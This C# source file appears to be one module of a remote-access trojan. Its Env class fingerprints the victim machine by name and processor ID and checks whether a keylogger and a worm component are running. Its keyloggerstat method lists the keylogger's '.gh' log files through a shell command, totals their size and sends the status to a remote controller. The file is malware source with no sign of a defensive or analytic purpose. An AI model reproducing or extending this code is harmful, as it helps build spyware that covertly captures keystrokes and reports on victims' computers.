using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO; 

namespace ConsoleApplication5
{
     public class Env
    {
        public byte[] ini()
        {
            byte[] b = new byte[500];

            b[0] = 0; // camm   TODO : class cam   
            try
            {
                b[1] = (byte)((InterceptKeys.etat) ? 1 : 0);
                b[2] = (byte)((worm.etat) ? 1 : 0);
            }
            catch (Exception e) {
                b[1] = 0;
                b[2] = 0; 
            }; 
            String name = System.Environment.MachineName;
            name = hardware.processorId() + "\n" + name; 
            Console.WriteLine(name);
            UTF8Encoding asen = new UTF8Encoding();
            byte[] ba = asen.GetBytes(name);

            Array.Copy(ba, 0, b, 3, ba.Length);

            return b;
        }


        public  void keyloggerstat() {
            String stat = (InterceptKeys.etat) ? "Working" : "Not Working";
            stat = stat + "\n" + InterceptKeys.lastworked;
            String output = Cmd.DoCommand("/C dir *.gh /B");
            String []files = output.Split('\n');
            String dir = Directory.GetCurrentDirectory();
            long taille = 0; 
            foreach (String a in files) {
                String file = @dir + Path.DirectorySeparatorChar + a.TrimEnd((char)13);
                Console.WriteLine(file); 
                if (File.Exists(file))
                {
                    long length=0;
                    
                    using (Stream stream = new FileStream(file, FileMode.Open))
                    {
                        length = stream.Length;
                    } 
                    taille += length;
                   
                }
            }
            stat += "\n" + taille.ToString(); 

            Cnx.sendString("a1"+stat); 
        }

    }


}
